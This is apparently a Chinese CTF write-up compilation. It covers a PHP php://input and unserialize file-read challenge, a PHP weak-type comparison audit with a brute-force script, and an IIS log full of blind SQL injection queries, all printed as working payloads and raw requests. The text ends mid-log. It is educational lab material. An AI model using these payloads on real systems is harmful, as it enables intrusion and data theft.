flag{a737c5c5b759c3705c8100accf65b5e4} the user is adminbugku原题，先通过PHP伪协议读取源代码，然后发现要利⽤反序列化漏洞读取flag⽂件。 1234567891011121314151617181920# index.php&lt;?php$user = $_GET[&quot;user&quot;];$file = $_GET[&quot;file&quot;];$pass = $_GET[&quot;pass&quot;];if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;POST这个数据包就能看到flagjoomlaecho &quot;hello admin!&lt;br&gt;&quot;;if(preg_match(&quot;/f1a9/&quot;,$file))&#123;exit();&#125;else&#123;include($file); //class.php$pass = unserialize($pass);echo $pass;&#125;&#125;else&#123;echo &quot;you are not admin ! &quot;;&#125;?&gt; 1234567891011# class.php&lt;?phpclass Read&#123;//f1a9.phppublic $file;public function __toString()&#123;if(isset($this-&gt;file))&#123;echo file_get_contents($this-&gt;file);&#125;return \"__toString was called!\";&#125;&#125; 本地测试获得序列化字符串： 12345678910111213141516&lt;?phpclass Read&#123;//f1a9.php public $file; public function __toString()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); &#125; return \"__toString was called!\"; &#125;&#125;$p = new Read();$p-&gt;file = 'f1a9.php';echo serialize($p);#$p == \"O:4:\"Read\":1:&#123;s:4:\"file\";s:8:\"f1a9.php\";&#125;\"?&gt; POST该数据包就能获得flag 123456789101112POST /web/theuserisadmin/index.php?file=class.php&amp;pass=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125;&amp;user=php://input HTTP/1.1Host: 192.168.200.200User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 17the user is admin flag{078d8dd8023d5716a11780adf344dfd2} 最好的语言源码审计题⽬，考察PHP弱类型⽐较： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpshow_source(__FILE__);$a=0;$b=0;$c=0;$d=0;if (isset($_GET['x1']))&#123;$x1 = $_GET['x1'];$x1==\"1\"?die(\"ha?\"):NULL;switch ($x1)&#123;case 0:case 1:$a=1;break;&#125;&#125;$x2=(array)json_decode(@$_GET['x2']);if(is_array($x2))&#123;is_numeric(@$x2[\"x21\"])?die(\"ha?\"):NULL;if(@$x2[\"x21\"])&#123;($x2[\"x21\"]&gt;2017)?$b=1:NULL;&#125;if(is_array(@$x2[\"x22\"]))&#123;if(count($x2[\"x22\"])!==2 OR !is_array($x2[\"x22\"][0])) die(\"ha?\");$p = array_search(\"XIPU\", $x2[\"x22\"]);$p===false?die(\"ha?\"):NULL;foreach($x2[\"x22\"] as $key=&gt;$val)&#123;$val===\"XIPU\"?die(\"ha?\"):NULL;&#125;$c=1;&#125;&#125;$x3 = $_GET['x3'];if ($x3 != '15562') &#123;if (strstr($x3, 'XIPU')) &#123;if (substr(md5($x3),8,16) == substr(md5('15562'),8,16)) &#123;$d=1;&#125;&#125;&#125;if($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123;include \"flag.php\";echo $flag;&#125;?&gt; 先来看第一个条件： 123456789101112if (isset($_GET[&apos;x1&apos;]))&#123;$x1 = $_GET[&apos;x1&apos;];$x1==&quot;1&quot;?die(&quot;ha?&quot;):NULL;switch ($x1)&#123;case 0:case 1:$a=1;break;&#125;&#125; 考察弱类型比较，switch函数处理字符串时也会对字符串进行intval处理 payload:x1=1a 第二个条件： 12345678910111213141516$x2=(array)json_decode(@$_GET['x2']);if(is_array($x2))&#123;is_numeric(@$x2[\"x21\"])?die(\"ha?\"):NULL;if(@$x2[\"x21\"])&#123;($x2[\"x21\"]&gt;2017)?$b=1:NULL;&#125;if(is_array(@$x2[\"x22\"]))&#123;if(count($x2[\"x22\"])!==2 OR !is_array($x2[\"x22\"][0])) die(\"ha?\");$p = array_search(\"XIPU\", $x2[\"x22\"]);$p===false?die(\"ha?\"):NULL;foreach($x2[\"x22\"] as $key=&gt;$val)&#123;$val===\"XIPU\"?die(\"ha?\"):NULL;&#125;$c=1;&#125;&#125; json_decode会对json格式的字符串进行解码，解码后通过(array)转化为数组 数组中必须含有键名x21和x22，其中键名x21对应的键值不能是数字字符串且必须大于2017，根据PHP弱类型比较可以赋值”x21”=&gt;”2017a” 键名x22对应键值必须是一个数组，且数组元素个数要等于2且数组第一个元素也必须是一个数组，然后键值数组的每一个元素都不能等于”XIPU”，但是array_search函数搜索键值数组中是否含有”XIPU”必须返回true，这里需要利用到array_search函数的特点，也是弱类型比较，”XIPU”intval值为0，数组中任一元素为0即可返回true 所以payload:x2={“x21”:”2017a”,”x22”:[[1],0]} 第三个条件： 12345678$x3 = $_GET[&apos;x3&apos;];if ($x3 != &apos;15562&apos;) &#123;if (strstr($x3, &apos;XIPU&apos;)) &#123;if (substr(md5($x3),8,16) == substr(md5(&apos;15562&apos;),8,16)) &#123;$d=1;&#125;&#125;&#125; $x3弱类型比较不等于’15562’，且’XIPU’必须出现在$x3中，且$x3经过md5函数加密后的第八位到第十六位等于’15562’经过md5函数加密后的第八位到第十六位 这里想不出怎么绕过，我就直接写了个脚本破解，脚本如下： 123456789101112import requestsurl = \"http://127.0.0.1/test/test34.php?x3=\"for i in range(1000000000): url = url + str(i) + 'XIPU' print(url) r = requests.get(url) print(r.text + ' i: ' + str(i)) url = \"http://127.0.0.1/test/test34.php?x3=\" if 'yes' in r.text: break 本地环境代码如下： 123456789&lt;?php$x3 = $_GET['x3'];echo substr(md5($x3),8,16);if(substr(md5('15562'),8,16) == substr(md5($x3),8,16) )&#123; echo 'yes';&#125;?&gt; 爆破结果为x3=47484XIPU 最终的payload: 1x1=1a&amp;x2=&#123;&quot;x21&quot;:&quot;2017a&quot;,&quot;x22&quot;:[[1],0]&#125;&amp;x3=47484XIPU 注入日志分析存在data.log文件 首先对文件进行url解码后搜索关键字flag，过滤出最后的盲注flag语句 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455562015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;64|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;32 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;56|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;52 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;54|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;53|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;64|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;32 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;56|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;52|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;50|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;49 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;64 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;96 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;112|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;104|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;100|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;98 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;99|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;64|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;32 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;56|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;52 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;54|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;53 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;64 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;96 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;112|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;104|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;100 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;102|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;101 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;64|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;32 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;56|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;52|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 02015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE 